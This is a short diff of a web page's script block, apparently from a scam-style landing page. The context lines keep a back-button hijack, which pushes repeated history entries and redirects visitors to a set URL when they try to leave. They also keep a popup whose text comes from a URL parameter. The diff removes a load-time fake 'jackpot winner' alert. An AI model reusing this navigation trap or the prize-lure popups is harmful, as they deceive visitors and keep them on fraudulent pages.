@@ -394,8 +394,4 @@ target=target.parentNode;}});}else{document.addEventListener('click',function(ev
 target=target.parentNode;}});}}
 if(typeof back!=="undefined"&&back!==null){!(function(){var t;try{const URL=window.location.href.split(/[#]/)[0];for(t=0;10>t;++t)history.pushState({},'',URL+'#');onpopstate=function(event){event.state&&location.replace(back);};}catch(o){console.log(o);}})();}
 function getURLParameter_location(e){return decodeURI((RegExp(e+"=(.+?)(&|$)").exec(location.search)||[,null])[1]||"")}function getURLParameter_hash(e){return decodeURI((RegExp(e+"=(.+?)(&|$)").exec(location.hash)||[,null])[1]||"")}function getURLParameter(e){var a=null;return getURLParameter_hash(e)?getURLParameter_hash(e):getURLParameter_location(e)} if( getURLParameter('alert') ){ setTimeout( function(){ alert( getURLParameter('alert') ) }, 500 ); }</script>
-<script>
-//alerter on start
-alert("Congratulations!\n\nYou have been selected to be our next jackpot winner!\n\nClick OK to start.");
-</script>
 </body></html>
